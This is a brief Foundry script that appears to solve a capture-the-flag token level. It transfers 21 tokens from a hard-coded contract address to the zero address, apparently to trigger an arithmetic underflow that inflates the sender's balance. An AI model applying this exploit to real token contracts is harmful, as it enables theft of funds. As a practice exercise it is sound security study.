pragma solidity ^0.8.0;
import "forge-std/Script.sol";
interface Itoken {
   function transfer(address _to, uint256 _value) external returns (bool);
   function balanceOf(address _owner) external view returns (uint256 balance);
}

contract ToeknScript is Script {
    function run() external {
        
        Itoken token = Itoken(0x2b644191378196224C9e2c1c3FD3aA1877C386A2);
        vm.startBroadcast();
        token.transfer(address(0), 21);
        
        vm.stopBroadcast();
    }
}